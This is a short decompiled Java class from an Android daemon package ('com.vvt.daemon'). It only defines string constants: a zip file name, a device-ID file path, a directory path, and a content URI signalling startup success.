package com.vvt.daemon;

import android.net.Uri;
import com.vvt.m.b;

public class h
{
  public static final String a;
  public static final String b;
  public static final String c;
  public static final Uri d = Uri.parse("content://com.fx.maind/startup_success");
  
  static
  {
    int i = 1;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "maind";
    a = String.format("%s.zip", arrayOfObject);
    arrayOfObject = new Object[i];
    String str = b.c;
    arrayOfObject[0] = str;
    b = String.format("%s/dev_id.ref", arrayOfObject);
    arrayOfObject = new Object[2];
    str = b.c;
    arrayOfObject[0] = str;
    arrayOfObject[i] = "maind";
    c = String.format("%s/%s", arrayOfObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/daemon/AppEngine1.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */